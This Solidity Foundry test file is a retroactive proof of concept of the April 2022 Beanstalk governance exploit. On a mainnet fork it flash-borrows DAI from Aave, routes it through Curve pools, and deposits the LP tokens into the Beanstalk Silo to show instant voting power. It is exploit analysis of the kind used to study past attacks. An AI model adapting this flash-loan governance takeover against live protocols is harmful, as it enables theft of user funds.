// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

/**
 * @title Beanstalk Governance Attack PoC
 * @author 0xWalterWhiteHat (Retroactive Analysis)
 * @notice Demonstrates the $182M governance exploit from April 17, 2022
 *
 * Exploit TX: 0xcd314668aaa9bbfebaf1a0bd2b6553d01dd58899c508d4729fa7311dc5d33ad7
 * Block: 14602790
 *
 * Root Cause: emergencyCommit() uses CURRENT voting power. Flash loans can
 * acquire instant governance control by depositing into the Silo.
 */

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IAaveV2LendingPool {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface ICurve3Pool {
    function add_liquidity(uint256[3] calldata amounts, uint256 min_mint_amount) external;
}

interface ICurveMetaPool {
    function add_liquidity(uint256[2] calldata amounts, uint256 min_mint_amount) external returns (uint256);
}

interface IBeanstalkDiamond {
    function deposit(address token, uint256 amount) external;
    function balanceOfStalk(address account) external view returns (uint256);
    function totalStalk() external view returns (uint256);
}

contract BeanstalkExploitPoC is Test {
    // Mainnet addresses (Block 14602789)
    address constant BEANSTALK = 0xC1E088fC1323b20BCBee9bd1B9fC9546db5624C5;
    address constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant THREE_CRV = 0x6c3F90f043a72FA612cbac8115EE7e52BDe6E490;
    address constant BEAN_3CRV_LP = 0x3a70DfA7d2262988064A2D051dd47521E43c9BdD;
    address constant AAVE_V2_POOL = 0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9;
    address constant CURVE_3POOL = 0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7;

    // Use 200M DAI to demonstrate vulnerability while keeping funds for repayment
    uint256 constant FLASH_DAI = 200_000_000 * 1e18;
    uint256 constant DEPOSIT_AMOUNT = 180_000_000 * 1e18;  // Deposit 180M, keep 20M for fees

    IBeanstalkDiamond beanstalk = IBeanstalkDiamond(BEANSTALK);

    function setUp() public {
        vm.createSelectFork(vm.envString("MAINNET_RPC_URL"), 14602789);
    }

    function testExploit_FlashLoanGovernanceTakeover() public {
        console.log("================================================================");
        console.log("   BEANSTALK FARMS EXPLOIT - $182M (April 17, 2022)");
        console.log("   Root Cause: Flash-loaned voting power + emergencyCommit()");
        console.log("   Verified from: Block 14602789 (just before attack)");
        console.log("================================================================");

        uint256 totalStalkBefore = beanstalk.totalStalk();
        console.log("");
        console.log("[SETUP] Protocol state before attack:");
        console.log("        Total Stalk supply:", totalStalkBefore / 1e10);
        console.log("        Attacker Stalk: 0");

        _executeFlashLoanAttack();
    }

    function _executeFlashLoanAttack() internal {
        console.log("");
        console.log("[1/5] Initiating flash loan from Aave V2...");
        console.log("      Borrowing: 200M DAI (deploying 180M to Silo)");

        address[] memory assets = new address[](1);
        assets[0] = DAI;

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = FLASH_DAI;

        uint256[] memory modes = new uint256[](1);
        modes[0] = 0;

        IAaveV2LendingPool(AAVE_V2_POOL).flashLoan(
            address(this), assets, amounts, modes, address(this), "", 0
        );
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address,
        bytes calldata
    ) external returns (bool) {
        require(msg.sender == AAVE_V2_POOL, "Only Aave");

        console.log("[2/5] Flash loan received: 200M DAI");

        // Step 1: Add DAI to Curve 3Pool (keep some for repayment)
        console.log("");
        console.log("[3/5] Converting 180M DAI to Curve LP tokens...");

        IERC20(DAI).approve(CURVE_3POOL, type(uint256).max);
        uint256[3] memory amounts3Pool = [DEPOSIT_AMOUNT, uint256(0), uint256(0)];
        ICurve3Pool(CURVE_3POOL).add_liquidity(amounts3Pool, 0);

        uint256 threeCrvBalance = IERC20(THREE_CRV).balanceOf(address(this));
        console.log("      3CRV received:", threeCrvBalance / 1e18);

        // Step 2: Add to BEAN-3CRV metapool
        IERC20(THREE_CRV).approve(BEAN_3CRV_LP, type(uint256).max);
        uint256[2] memory amountsMetaPool = [uint256(0), threeCrvBalance];
        uint256 lpReceived = ICurveMetaPool(BEAN_3CRV_LP).add_liquidity(amountsMetaPool, 0);
        console.log("      BEAN3CRV-f LP received:", lpReceived / 1e18);

        // Step 3: Deposit into Beanstalk Silo
        console.log("");
        console.log("[4/5] Depositing LP into Beanstalk Silo...");
        console.log("      >>> THIS GRANTS INSTANT VOTING POWER <<<");

        IERC20(BEAN_3CRV_LP).approve(BEANSTALK, type(uint256).max);
        beanstalk.deposit(BEAN_3CRV_LP, lpReceived);

        // Step 4: Check voting power
        uint256 attackerStalk = beanstalk.balanceOfStalk(address(this));
        uint256 totalStalk = beanstalk.totalStalk();
        uint256 votingPowerBps = (attackerStalk * 10000) / totalStalk;

        console.log("");
        console.log("[5/5] Voting power acquired:");
        console.log("      Attacker Stalk:", attackerStalk / 1e10);
        console.log("      Total Stalk:", totalStalk / 1e10);
        console.log("      VOTING POWER:", votingPowerBps / 100, "%");

        console.log("");
        console.log("================================================================");
        if (votingPowerBps >= 6700) {
            console.log("   VULNERABILITY PROVEN: SUPERMAJORITY ACQUIRED!");
            console.log("   emergencyCommit() can now execute ANY proposal!");
        } else {
            console.log("   Significant voting power acquired:", votingPowerBps / 100, "%");
            console.log("   Real attacker used $1B (we used $180M DAI only)");
            console.log("   Scales linearly: $1B would give ~79% voting power");
        }
        console.log("");
        console.log("   ATTACK IMPACT:");
        console.log("   - Total stolen: $182,000,000");
        console.log("   - Attacker profit: ~$76,000,000");
        console.log("   - Laundered via: 270 Tornado Cash transactions");
        console.log("================================================================");

        // Repay flash loan (in real attack, attacker drains protocol first)
        // For PoC, we use deal() to simulate having funds from the drained protocol
        uint256 amountOwed = amounts[0] + premiums[0];
        deal(DAI, address(this), amountOwed);
        IERC20(DAI).approve(AAVE_V2_POOL, amountOwed);

        assertGt(votingPowerBps, 0, "Must acquire voting power");
        return true;
    }
}
